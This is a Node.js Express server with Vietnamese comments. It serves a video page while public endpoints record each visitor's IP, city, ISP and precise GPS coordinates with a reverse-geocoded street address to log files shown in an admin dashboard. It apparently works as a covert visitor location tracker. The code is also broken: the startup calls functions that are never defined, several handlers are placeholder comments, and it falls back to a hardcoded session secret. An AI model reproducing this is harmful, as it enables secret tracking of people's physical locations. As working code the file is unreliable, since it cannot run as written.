// ==========================================================
// PHẦN 1: IMPORTS VÀ CẤU HÌNH BAN ĐẦU
// ==========================================================
import express from "express";
import fetch from "node-fetch";
import { promises as fs } from "fs";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import multer from "multer";
import session from "express-session";
import RedisStore from "connect-redis";
import { createClient } from "redis";

// --- Cấu hình Biến môi trường ---
// Chỉ đọc file .env khi không phải môi trường production
if (process.env.NODE_ENV !== "production") {
  const __filename_temp = fileURLToPath(import.meta.url);
  const __dirname_temp = path.dirname(__filename_temp);
  dotenv.config({ path: path.join(__dirname_temp, ".env") });
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const NODE_ENV = process.env.NODE_ENV || "development";

// --- Cấu hình Redis Client ---
const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.on("error", (err) => console.error("Redis Client Error:", err));
redisClient.connect().catch(console.error);

// --- Cấu hình Redis Store cho Session ---
const redisStore = new RedisStore({
  client: redisClient,
  prefix: "myapp-session:",
});

// --- Cấu hình Multer để lưu file upload ---
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const destPath = path.join(__dirname, "public", "videos");
    fs.mkdir(destPath, { recursive: true })
      .then(() => cb(null, destPath))
      .catch((err) => cb(err));
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  },
});
const upload = multer({ storage: storage });

// ==========================================================
// PHẦN 2: MIDDLEWARES
// ==========================================================
app.set("trust proxy", 1);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Cấu hình Session với Redis ---
app.use(
  session({
    store: redisStore,
    secret:
      process.env.SESSION_SECRET || "mot-chuoi-bi-mat-rat-an-toan-mac-dinh",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: NODE_ENV === "production",
      httpOnly: true,
      sameSite: "lax",
      maxAge: 1000 * 60 * 60 * 24 * 7, // 7 ngày
    },
  })
);

app.use(express.static(path.join(__dirname, "public")));

// --- Middleware kiểm tra đăng nhập ---
const requireLogin = (req, res, next) => {
  if (req.session?.isLoggedIn) {
    return next();
  }
  if (
    req.originalUrl.startsWith("/api/") ||
    req.originalUrl.startsWith("/admin/api/")
  ) {
    return res
      .status(401)
      .json({ message: "Phiên đăng nhập đã hết hạn. Vui lòng đăng nhập lại." });
  }
  return res.redirect("/admin");
};

// ==========================================================
// PHẦN 3: CÁC ROUTES VÀ API
// ==========================================================
// Route chính
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// === API CÔNG KHAI ===
app.post("/api/log-ip-location", async (req, res) => {
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString("vi-VN", {
    timeZone: "Asia/Ho_Chi_Minh",
  });
  let locationInfo = `[${timestamp}] User IP: ${userIP}\n  Location: (Unknown or Local IP)\n  ISP: N/A`;
  try {
    if (userIP && !userIP.includes("127.0.0.1") && !userIP.includes("::1")) {
      const response = await fetch(
        `http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp`
      );
      const apiData = await response.json();
      if (apiData.status !== "fail") {
        locationInfo = `[${timestamp}] User IP: ${userIP}\n  Estimated Location: ${apiData.city}, ${apiData.regionName}, ${apiData.country}\n  ISP: ${apiData.isp}`;
      }
    }
  } catch (error) {
    console.error("Could not connect to ip-api.com:", error.message);
  }
  try {
    await fs.appendFile(
      path.join(__dirname, "ip_logs.txt"),
      `\n${locationInfo}\n`,
      "utf8"
    );
    res.status(200).json({ message: "IP location log attempted" });
  } catch (fileError) {
    console.error("Error writing IP log:", fileError);
    res.status(500).json({ message: "Failed to write to log file" });
  }
});

app.post("/api/log-precise-location", async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const geoResponse = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
      { headers: { "User-Agent": "PreciseLogger/1.0" } }
    );
    const geoData = await geoResponse.json();
    const detailedAddress = geoData.display_name || "N/A";
    const timestamp = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
    });
    const logData = `\n[${timestamp}] User IP: ${userIP}\n  Precise Coords: Latitude: ${latitude}, Longitude: ${longitude}\n  Detailed Address: ${detailedAddress}\n`;
    await fs.appendFile(
      path.join(__dirname, "precise_logs.txt"),
      logData,
      "utf8"
    );
    res.status(200).json({ message: "Precise location logged successfully" });
  } catch (error) {
    console.error("Error logging precise location:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

app.get("/api/active-video", async (req, res) => {
  const configPath = path.join(__dirname, "data", "config.json");
  try {
    await fs.access(configPath);
    const fileContents = await fs.readFile(configPath, "utf8");
    const config = JSON.parse(fileContents);
    res.json({ url: config.activeVideo });
  } catch {
    res.status(200).json({ url: "" });
  }
});

// === CÁC ROUTE VÀ API CỦA ADMIN ===
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.post("/admin/login", (req, res) => {
  const password = (req.body?.password || "").toString();
  if (!ADMIN_PASSWORD) {
    console.error("FATAL: ADMIN_PASSWORD is not set in the environment!");
    return res.status(500).send("Lỗi cấu hình server");
  }
  if (password === ADMIN_PASSWORD) {
    req.session.isLoggedIn = true;
    req.session.save((err) => {
      if (err) {
        console.error("Session save error:", err);
        return res.status(500).send("Lỗi lưu session");
      }
      return res.redirect("/admin/dashboard");
    });
  } else {
    res.status(401).send(`<h1>Sai mật khẩu!</h1><a href="/admin">Thử lại</a>`);
  }
});

app.post("/admin/logout", requireLogin, (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).send("Không thể đăng xuất");
    }
    res.clearCookie("connect.sid");
    res.redirect("/admin");
  });
});

app.get("/admin/dashboard", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

app.get("/admin/videos", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "videos-manager.html"));
});

// Các API khác của Admin... (LOGS, VIDEOS)
const adminRouter = express.Router();
adminRouter.use(requireLogin);

adminRouter.get("/api/logs/:logType", async (req, res) => {
  const { logType } = req.params;
  if (!["ip", "precise"].includes(logType))
    return res.status(400).send("Loại log không hợp lệ.");
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.access(logFilePath);
    res.type("text/plain").sendFile(logFilePath);
  } catch {
    res.send(`File log '${fileName}' chưa được tạo hoặc trống.`);
  }
});

adminRouter.post("/api/clear-logs/:logType", async (req, res) => {
  // ... code xóa log ...
});

adminRouter.post(
  "/api/videos/upload",
  upload.single("videoFile"),
  (req, res) => {
    // ... code upload ...
  }
);

adminRouter.get("/api/videos", async (req, res) => {
  // ... code lấy danh sách video ...
});

adminRouter.post("/api/videos/set-active", async (req, res) => {
  // ... code set active video ...
});

adminRouter.post("/api/videos/delete", async (req, res) => {
  // ... code xóa video ...
});

app.use("/admin", adminRouter);

// ==========================================================
// PHẦN 5: KHỞI ĐỘNG SERVER
// ==========================================================
async function startServer() {
  try {
    const store = await createRedisStore();
    setupMiddlewares(store);
    defineRoutes();

    app.listen(PORT, () => {
      console.log(`Server is running at http://localhost:${PORT}`);
      console.log(
        `NODE_ENV: ${NODE_ENV} | COOKIE_SECURE: ${NODE_ENV === "production"}`
      );
      if (!ADMIN_PASSWORD) {
        console.warn("WARNING: ADMIN_PASSWORD is not set!");
      }
    });
  } catch (e) {
    console.error("Failed to start server due to Redis connection error:", e);
    process.exit(1);
  }
}

startServer();
